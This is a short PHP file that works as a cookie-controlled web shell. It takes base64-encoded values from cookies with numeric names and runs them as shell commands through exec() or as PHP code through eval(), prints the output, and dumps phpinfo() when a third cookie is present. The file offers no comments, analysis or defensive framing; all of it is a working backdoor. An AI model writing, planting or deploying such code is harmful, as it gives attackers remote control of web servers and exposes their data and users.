<?php
	echo "$#@&\n\n";

	if(isset($_COOKIE['76027405']) && !empty($_COOKIE['76027405'])) {
		echo htmlentities((string) base64_decode($_COOKIE['76027405']),ENT_QUOTES);
		echo "<pre>";
		$outbuf="";$outstr="";exec(base64_decode($_COOKIE['76027405']),$outbuf);foreach($outbuf as $val) $outstr.=$val."\r\n";echo htmlentities($outstr);
	} elseif(isset($_COOKIE['26312595']) && !empty($_COOKIE['26312595'])) {
		echo htmlentities((string) base64_decode($_COOKIE['26312595']),ENT_QUOTES);
		echo "<pre>"; 
		eval((string) base64_decode($_COOKIE['26312595']));
	} elseif(isset($_COOKIE['13037085'])) {
		phpinfo();
	}

?>